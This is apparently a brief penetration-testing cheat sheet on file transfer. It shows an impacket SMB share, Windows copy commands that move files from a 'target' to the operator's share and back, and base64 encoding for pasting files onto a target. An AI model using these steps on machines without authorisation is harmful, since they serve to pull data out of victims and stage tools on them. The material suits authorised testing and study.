# File-Transfer
## Collection of File Transfer possibilities

Sometimes it is useful to have a Plan B if you need to transfer a file from or to a remote machine.

## SMBserver
Start a SMBserver in you current directory [.] to copy & paste files back and forth
```bash
sudo impacket-smbserver -smb2support share[NAME] .[/PATH] 
```
Copy from Windows Target
```bash
copy .\file.ext \\myIP\share\file.ext
```
Copy to a Windows Target
```bash
copy \\myIP\share\file.ext .\file.ext
```
Make sure to stop the SMBserver after transfer because everybody in that network has access to your SMBserver

## Base64
If all else fails, there is always plan y. <br>
Convert a file or program to a Base64 string copy & paste it to the Target and deconvert it. <br>
<br>
On Linux
```bash
base64 file.ext > fileb64.txt
cat fileb64.txt
```
On Windows
```bash
[convert]::ToBase64String((Get-Content -path "file.ext" -Encoding byte))
```
Copy the Base64 string.
```bash
vim string.b64
```
Paste the string to any Text-Editor.
```bash
base64 -d string.b64 > file.ext
```
